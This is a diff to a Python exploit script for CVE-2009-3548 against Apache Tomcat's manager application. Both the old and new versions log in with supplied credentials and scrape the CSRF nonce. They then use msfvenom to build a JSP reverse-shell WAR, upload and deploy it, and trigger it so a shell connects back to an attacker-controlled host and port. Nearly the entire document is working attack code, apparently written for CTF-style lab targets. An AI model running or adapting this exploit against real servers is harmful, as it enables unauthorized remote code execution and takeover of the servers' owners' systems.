@@ -12,36 +12,24 @@ from log_colors import *
 # CVE-2009-3548
 class CVE2009_3548:
 
-    def __init__(self, host, port, path, usr, pswd):
-        url = "http://" + host + ":" + port + "/" + path.strip('/')
+    def __init__(self, url, login, passwd, lhost, lport):
         print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
-        self.host, self.port = host, port
-        self.usr, self.pswd = usr, pswd
-        self.url = url
+        self.url = url.rstrip("/")
+        self.lhost, self.lport = lhost, lport
+        self.login, self.passwd = login, passwd
         self.session = requests.Session()
-        self.headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0", 
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Accept-Encoding": "gzip, deflate",
-            "Cache-Control": "max-age=0",
-            "Host" : self.host + ":" + self.port,
-            "Connection" : "keep-alive",
-            "DNT" : "1",
-            "Origin" : "http://" + self.host + ":" + self.port,
-            "Upgrade-Insecrure-Requests" : '1',
-        }
+        self.headers = {"User-Agent": "Mozilla/5.0"}
 
     # login basic auth
-    def login(self):
-        print (LogColors.BLUE + "login: " + self.usr + ":" + self.pswd + "..." + LogColors.ENDC)
+    def login_basic(self):
+        print (LogColors.BLUE + "login with credentials..." + LogColors.ENDC)
         try:
             r = self.session.get(
-                self.url,
-                auth = requests.auth.HTTPBasicAuth(self.usr, self.pswd),
+                self.url + "/manager/html",
+                auth = requests.auth.HTTPBasicAuth(self.login, self.passwd),
                 headers = self.headers
             )
-            if r.status_code in (401, 403):
+            if "/manager/html/deploy" in r.text:
                 print (LogColors.YELLOW + "successfully login..." + LogColors.ENDC)
             else:
                 print (LogColors.RED + "login failed :(" + LogColors.ENDC)
@@ -51,14 +39,13 @@ class CVE2009_3548:
             sys.exit()
 
     # generate payload with reverse shell
-    def generate_payload(self, lhost, lport):
-        self.lhost, self.lport = lhost, lport
+    def generate_payload(self):
         print (LogColors.BLUE + "generate reverse shell payload..." + LogColors.ENDC)
         msfv = "msfvenom -p java/jsp_shell_reverse_tcp"
         msfv += " LHOST=" + lhost
         msfv += " LPORT=" + lport
         msfv += " -f war"
-        msfv += " -o shell.war"
+        msfv += " -o /tmp/hack.war"
         print (LogColors.YELLOW + msfv + LogColors.ENDC)
         try:
             p = subprocess.Popen(msfv.split(), stdout = subprocess.PIPE)
@@ -66,14 +53,13 @@ class CVE2009_3548:
             print (LogColors.GREEN + "reverse shell payload successfully generated :)" + LogColors.ENDC)
         except Exception as e:
             print (LogColors.RED + "generate payload failed :(" + LogColors.ENDC)
+            sys.exit()
     
     # get csrf token
     def get_csrf_token(self):
-        csrf = None
-        csrf_url = self.url + "/list"
-        r = self.session.get(
-            csrf_url, 
-            auth = requests.auth.HTTPBasicAuth(self.usr, self.pswd),
+        print (LogColors.BLUE + "get csrf token..." + LogColors.ENDC)
+        r = self.session.get(self.url + "/manager/html/list", 
+            auth = requests.auth.HTTPBasicAuth(self.login, self.passwd),
             headers = self.headers)
         if r.ok:
             tree = lxml.html.fromstring(r.text)
@@ -84,78 +70,72 @@ class CVE2009_3548:
                 print (LogColors.YELLOW + "csrf token: " + csrf + LogColors.ENDC)
             else:
                 print (LogColors.RED + "csrf not found :(" + LogColors.ENDC)
+                sys.exit()
         else:
-            print (LogColors.RED + "csrf token not found :(" + LogColors.ENDC)
-        return csrf
+            print (LogColors.RED + "failed to parse csrf token :(" + LogColors.ENDC)
+            sys.exit()
 
     # upload payload
     def upload_payload(self):
-        upload_url = self.url + "/upload"
-        upload_url += "?org.apache.catalina.filters.CSRF_NONCE=" + self.csrf
-        boundary_id = ''.join(random.choice(string.digits) for i in range(28))
-        ctype = 'multipart/form-data;' 
-        ctype += 'boundary=---------------------------' + boundary_id
-        self.headers["Content-Type"] = ctype
-        with open("shell.war", "rb") as f:
-            data = f.read()
-            self.headers["Content-Length"] = str(len(data))
-            print (LogColors.YELLOW + "uploading " + str(len(data)) + " bytes as payload..." + LogColors.ENDC)
-            war = "---------------------------"
-            war += boundary_id
-            war += "\r\nContent-Disposition: form-data;"
-            war += ' name="deployWar"; filename="shell.war"'
-            war += '\r\nContent-Type: application/octet-stream\r\n\r\n'
-            war += str(data)
-            war += "\r\n-----------------------------"
-            war += boundary_id
-            war += "--\r\n"
-
-            files = {"deployWar" : f}
-            r = self.session.post(
-                upload_url,
-                auth = requests.auth.HTTPBasicAuth(self.usr, self.pswd),
-                files = files,
-                #data = war,
-                headers = self.headers
-            )
+        upload_url = self.url + "/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=" + self.csrf
+        basic_raw = "{}:{}".format(self.login, self.passwd)
+        basic_encoded = base64.b64encode(basic_raw.encode()).decode("utf-8")
+        
+        headers = {
+            "Authorization": "Basic {}".format(basic_encoded),
+            "Host" : self.url.strip("http://").strip("https://").strip("/"),
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Referer": self.url + "/manager/html"
+        }
+        files = {
+            "deployWar" : ("hack.war", open("/tmp/hack.war" ,"rb"), "application/octet-stream")
+        }
+        try:
+            r = self.session.post(upload_url, files = files, headers = headers)
+        except Exception as e:
+            print (LogColors.RED + "failed to upload shell..." + LogColors.ENDC)
+            sys.exit()
+        else:
             if r.ok:
-                print (LogColors.GREEN + "payload successfully upload :)" + LogColors.ENDC)
+                print (LogColors.GREEN + "successfully upload shell :)" + LogColors.ENDC)
             else:
-                print (LogColors.RED + "payload upload failed. code " + str(r.status_code) + " :(" + LogColors.ENDC)
+                print (LogColors.RED + "failed to upload shell..." + LogColors.ENDC)
+                sys.exit()
 
     # activate your shell
     def activate_shell(self):
+        print (LogColors.BLUE + "activate shell..." + LogColors.ENDC)
         r = self.session.get(
-                "http://" + self.host + ":" + self.port + "/shell",
-                auth = requests.auth.HTTPBasicAuth(self.usr, self.pswd),
-                headers = self.headers
-            )
+            self.url + "/hack",
+            auth = requests.auth.HTTPBasicAuth(self.login, self.passwd),
+            headers = self.headers
+        )
         if r.ok:
             print (LogColors.GREEN + "successfully hacked :)" + LogColors.ENDC)
             print (LogColors.GREEN + "check your netcat on " + self.lhost + " " + self.lport + LogColors.ENDC)
         else:
             print (LogColors.RED + "error when activate shell :(" + LogColors.ENDC)
 
+    # exploit
+    def exploit(self):
+        self.login_basic()
+        self.get_csrf_token()
+        self.generate_payload()
+        self.upload_payload()
+        self.activate_shell()
+
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
-    parser.add_argument('-t','--target', required = True, help = "target ip/host")
-    parser.add_argument('-p', '--port', required = True, default = "8080", help = "port with a shell")
-    parser.add_argument('-d','--dir', required = True, help = "target uri path (/manager/html)")
-    parser.add_argument('-u','--username', required = True, help = "tomcat username (tomcat)")
-    parser.add_argument('-s','--password', required = True, help = "tomcat password (s3cret)")
-    parser.add_argument('-lh','--lhost', required = True, help = "host for shell return")
-    parser.add_argument('-lp','--lport', required = True, help = "port for shell return")
+    parser.add_argument('-u','--url', required = True, help = "target ip/host")
+    parser.add_argument('-U','--username', required = True, help = "tomcat username")
+    parser.add_argument('-P','--password', required = True, help = "tomcat password")
+    parser.add_argument('-i','--lhost', required = True, help = "local host for rev sh")
+    parser.add_argument('-p','--lport', required = True, help = "local port for rev sh", default = '4444')
     args = vars(parser.parse_args())
-    print (LogColors.GREEN + 'Usage: $python cve_2009_3548.py -t 10.10.10.3 -p 8080 -path /manager/html --username tomcat --password tomcat --lhost 10.10.14.12 --lport 4444' + LogColors.ENDC)
-    host, port = args['target'], args['port']
+    url = args['url']
     usr, pswd = args['username'], args['password']
-    path = args['dir']
     lhost, lport = args['lhost'], args['lport']
-    cve = CVE2009_3548(host, port, path, usr, pswd)
-    cve.login()
-    cve.get_csrf_token()
-    cve.generate_payload(lhost, lport)
-    cve.upload_payload()
-    cve.activate_shell()
+    cve = CVE2009_3548(url, usr, pswd, lhost, lport)
+    cve.exploit()
 
 
